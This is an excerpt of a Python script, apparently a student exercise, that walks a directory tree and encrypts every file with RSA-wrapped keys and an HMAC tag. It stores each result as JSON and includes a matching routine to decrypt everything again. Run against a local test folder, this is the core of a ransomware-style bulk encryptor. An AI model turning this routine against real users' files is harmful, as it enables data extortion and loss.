...
def myRSADecrypt(filepath, RSACipher, cipher_text, IV, tag, file_ext, RSA_privatekey_filepath):
    ...
    plainText = MyfileDecryptHMAC(IV, tag, EncKey, HMACKey, filepath)
...
def encryptAll(directory, publicPemKeyPath):
    
    #for files in os.listdir(testDir):
    for root, dirs, folderFiles in os.walk(directory):
        
        for files in folderFiles:
            if not files.endswith(".pem"):
                filePath = root + "/" + files

                (RSACipher, C, IV, tag, ext) = myRSAEncrypt(filePath, publicPemKeyPath)

                # Encodes the ciphertext, encrypted keys, and HMAC tag into JSON serializable format
                ciphertext = base64.encodebytes(C)
                encodedCiphertext = ciphertext.decode('ascii')
                encryptedKeys = base64.encodebytes(RSACipher)
                encodedEncryptedKeys = encryptedKeys.decode('ascii')
                HMACTag = base64.encodebytes(tag)
                encodedHMACTag = HMACTag.decode('ascii')
                nIV = base64.encodebytes(IV)
                encodedIV = nIV.decode('ascii')
                
                #print(btsHMACTag)
                
                # Puts information above into a JSON object
                jsonObject = { "RSA Ciphertext" : encodedEncryptedKeys, "Ciphertext" : encodedCiphertext, "HMAC Tag" : encodedHMACTag, "IV" : encodedIV, "Extension" : ext }
                JSONFile = json.dumps(jsonObject)

                # JSON file names
                jsonPath = os.path.join(root, (os.path.splitext(files)[0] + ".json"))

                # Writes the JSON object into a JSON file
...
def decryptAll(directory, privatePemKeyPath):
    keypair = []
    ...
    for root, dirs, filesToDecrypt in os.walk(directory):
        for files in filesToDecrypt:
            if files.endswith('.json'):
                filePath = root + "/" + files
                jsonInput = open(filePath, "r")
                jsonData = jsonInput.read()

                JSONObject = json.loads(jsonData)

                # Puts each value of each key in a variable to be used later
                ciphertext = JSONObject["Ciphertext"].encode('ascii')
                decodedCiphertext = base64.decodebytes(ciphertext)
                encryptedKeys = JSONObject["RSA Ciphertext"].encode('ascii')
                decodedEncryptedKeys = base64.decodebytes(encryptedKeys)
                HMACTag = JSONObject["HMAC Tag"].encode('ascii')
                decodedHMACTag = base64.decodebytes(HMACTag)
                nIV = JSONObject["IV"].encode('ascii')
                decodedIV = base64.decodebytes(nIV)
                ext = JSONObject["Extension"]
                
                #print(decodedHMACTag)
                plaintext = myRSADecrypt(filePath, decodedEncryptedKeys, decodedCiphertext, decodedIV, decodedHMACTag, ext, privatePemKeyPath)
                originalPath = os.path.join(root, (os.path.splitext(files)[0] + ext))

                fileOut = open(originalPath, "wb")
                fileOut.write(plaintext)

                os.remove(filePath)
            elif files == "publicKey.pem" or files == "privateKey.pem":
                filePath = root + "/" + files

                if not filePath in keypair or not keypair:
                    keypair.append(filePath)
...
def main():
    filepath = "C:\\Users\\James\\Desktop\\School\\CECS 378\\testing folder\\"
    ...
    #RSA_publickey_filepath = os.getcwd()+'publicKey.pem'
    #RSA_privatekey_filepath = os.getcwd()+'privateKey.pem'
    
    (RSA_publickey_filepath, RSA_privatekey_filepath) = RSAKeyGen(RSA_publickey_filepath, RSA_privatekey_filepath)
    encryptAll(filepath, RSA_publickey_filepath)
    ...
    decryptAll(filepath, RSA_privatekey_filepath) 
